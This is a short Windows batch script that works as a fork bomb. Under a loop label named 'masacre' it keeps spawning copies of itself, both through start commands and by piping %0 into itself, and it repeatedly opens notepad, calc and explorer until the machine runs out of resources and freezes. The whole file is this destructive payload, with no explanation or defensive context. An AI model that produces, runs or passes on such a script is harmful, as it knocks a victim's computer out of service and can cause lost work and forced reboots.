@echo off
for /l %%i in (1,1,50) do start "" %0
:masacre
start "" cmd /c "%~f0"
start "" notepad
start "" calc
start "" explorer
%0|%0|%0|%0|%0
goto masacre